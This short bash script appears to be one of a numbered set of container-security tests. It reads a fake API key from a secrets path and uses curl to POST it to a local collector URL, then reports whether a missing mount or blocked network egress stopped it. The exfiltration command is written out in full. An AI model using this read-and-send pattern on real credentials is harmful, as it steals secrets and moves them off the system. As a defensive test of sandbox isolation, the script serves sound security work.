#!/usr/bin/env bash
# Attack 5 — Exfiltrate a (fake) secret to a LOCAL collector.
# Objective: read a credential and send it off-box.
# Two independent defences are tested: (a) is the secret even present in the
# container? (b) can the container reach the network at all?
set -uo pipefail
ATTACK_NAME="05_exfiltrate_secret"
source "$(dirname "$0")/lib.sh"

SECRET_FILE="/run/secrets/fake_api_key"
COLLECTOR="${COLLECTOR_URL:-http://collector:9000/exfil}"

if [ ! -r "$SECRET_FILE" ]; then
  report_blocked "secret not present in container (not mounted)"
fi

DATA="$(cat "$SECRET_FILE" 2>/dev/null)"
err="$( curl -fsS --max-time 5 -X POST --data "stolen=${DATA}" "$COLLECTOR" 2>&1 >/dev/null )"
if [ $? -eq 0 ] && [ -z "$err" ]; then
  report_success "secret exfiltrated to ${COLLECTOR}"
else
  report_blocked "egress failed: ${err:-no-network}"
fi
